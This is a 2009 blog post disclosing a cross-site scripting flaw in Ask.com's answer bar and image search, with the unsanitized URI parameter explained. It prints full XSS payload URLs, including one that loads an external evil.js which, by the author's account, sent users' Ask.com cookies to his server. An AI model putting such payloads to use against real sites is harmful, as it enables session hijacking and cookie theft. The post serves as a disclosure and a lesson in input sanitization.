---
date: '2009-03-04 14:30:42'
layout: post
slug: answer-bar-xss
status: publish
title: Ask.com Answer Bar XSS
wordpress_id: '126'
categories:
- Computers
---

Last month, [Ask.com](http://www.ask.com/) introduced a new feature called the answer bar. It's an annoying iframe that shows up when you click on most search results. The answer bar obscures the real URI in the address bar, and you have to accept cookies to disable it. But the purpose of this post isn't to vent; it's to explain how until today, the answer bar was vulnerable to cross-site scripting attacks. 

Search result links look like this: (the answer bar now checks referrers so even copy-pasting won't work)

`http://www.ask.com/bar?q=ask&page;=1&qsrc;=0&zoom;=&ab;=0&u;=http://google.com`

The URI param wasn't checked. Any URI scheme was allowed, including javascript: and data:. JavaScript in the URI was run in ask.com's security context. [This link worked until very recently.](http://www.ask.com/bar?q=ask&page=1&qsrc=0&zoom=&ab=0&u=javascript:document.write(%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22);) Once I knew I could run arbitrary JavaScript, I wrote a proof of concept.

For a demonstration, I asked some coworkers to make sure they were logged in to Ask.com, then click [here](http://tinyurl.com/cwd3uq). TinyURL redirects to...

`http://www.ask.com/bar?q=ask&page;=1&qsrc;=0&zoom;=&ab;=0&u;=javascript:document.write(%22%3Cscript%20src= \%22http://geoff.greer.fm/evil/evil.js?cachebuster=Math.random()\%22%3E%3C/script%3E%22);`

...which downloaded and ran [evil.js](/evil/evil.js). Evil.js sent ask.com cookies to my site, then added an item to the user's [MyStuff](http://mystuff.ask.com/) saved results. The MyStuff item linked to [everyone's cookie info](/evil/suckers.php).

It's a good thing Ask doesn't have any useful features, otherwise this vulnerability would be newsworthy. Instead it's just XSS practice for me and another security mistake by Ask. Ask deployed the answer bar on February 5th. E-mails were sent, tickets were filed, and it was fixed today, March 4th. Of course, that one bug is the [tip of the iceberg](http://www.xssed.com/search?key=ask.com). Thanks to [Paul](http://journal.paul.querna.org/) for pointing me to that site.

Edit: Image search still has this bug. 
Edit2: These links no longer work because Ask added HTTP referrer checks to image search. 

This will show your ask.com cookies:

[`http://images.ask.com/fr?q=blah&desturi;=javascript%3Adocument.write%28%22%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%22%29&fm;=i`](http://images.ask.com/fr?q=blah&desturi=javascript%3Adocument.write%28%22%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%22%29&fm=i)

And this will demonstrate evil.js if you are logged in to MyStuff:

[`http://images.ask.com/fr?q=blah&desturi;=javascript:document.write(%22%3Cscript%20src=\%22http://geoff.greer.fm/evil/evil.js?cachebuster=Math.random()\%22%3E%3C/script%3E%22);&fm;=i`](http://images.ask.com/fr?q=blah&desturi=javascript:document.write(%22%3Cscript%20src=\%22http://geoff.greer.fm/evil/evil.js?cachebuster=Math.random()\%22%3E%3C/script%3E%22);&fm=i)

If there is one thing you should learn from this, it is: **sanitize**.
